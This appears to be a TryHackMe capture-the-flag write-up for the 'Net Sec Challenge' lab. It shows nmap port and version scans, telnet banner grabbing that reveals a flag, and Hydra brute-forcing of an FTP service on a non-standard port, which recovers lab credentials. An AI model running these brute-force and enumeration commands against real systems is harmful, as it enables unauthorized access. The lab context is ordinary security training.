---
title: "Net Sec Challange"
date: 2025-08-03 12:00:00 +0300
categories: [Writeups, TryHackMe]
tags: [tryhackme, ctf, writeup, pentesting, security]
description: "Port scan evasion techniques, Hydra FTP brute-forcing, telnet enumeration, and network traffic analysis."
image:
  path: /assets/img/posts/net-sec-challange.png
  alt: Net Sec Challenge (TryHackMe)
---

# Enumaration

```jsx
└─$ nmap -sT 10.10.11.3                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 11:35 EDT
Nmap scan report for 10.10.11.3
Host is up (0.068s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
```

and for all

```jsx
└─$ nmap -sT -p- 10.10.11.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 11:37 EDT
Nmap scan report for 10.10.11.3
Host is up (0.069s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy
10021/tcp open  unknown

```

```jsx
└─$ telnet 10.10.11.3 21
Trying 10.10.11.3...
telnet: Unable to connect to remote host: Connection refused
                                                                             
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.11.3 22
Trying 10.10.11.3...
Connected to 10.10.11.3.
Escape character is '^]'.
SSH-2.0-OpenSSH_8.2p1 THM{946219583339} 

```

there, i do call ftp because of challenges but i realize that there is open ports and ftp is not open, so for another challenge i call for ssh and boom.

```jsx
─$ nmap -sV --version-light -p10021 10.10.11.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 11:59 EDT
Nmap scan report for 10.10.11.3
Host is up (0.067s latency).

PORT      STATE SERVICE VERSION
10021/tcp open  ftp     vsftpd 3.0.5
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
`
```

```jsx
~# hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.11.3 -s 10021
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-03 17:19:51
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.11.3:10021/
[10021][ftp] host: 10.10.11.3   login: eddie   password: jordan
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-03 17:20:14

---

-------------------------------------------------------------------------------------
# hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.10.11.3 -s 10021
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-03 17:20:24
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.11.3:10021/
[10021][ftp] host: 10.10.11.3   login: quinn   password: andrea
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-03 17:20:36

```

so in here, before i spesifically added `-s 10021` it just i think trying it on regular ftp ports….
